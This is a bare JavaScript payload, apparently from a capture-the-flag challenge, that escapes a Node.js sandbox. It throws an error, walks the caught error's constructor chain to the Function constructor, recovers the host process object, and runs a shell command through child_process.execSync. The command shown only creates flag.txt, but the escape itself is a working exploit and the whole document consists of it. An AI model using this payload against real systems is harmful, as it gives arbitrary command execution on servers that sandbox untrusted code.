(function() { 
    try{ 
        propertyIsEnumerable.call();
    } catch(pp){
        pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag.txt');
    }
})()
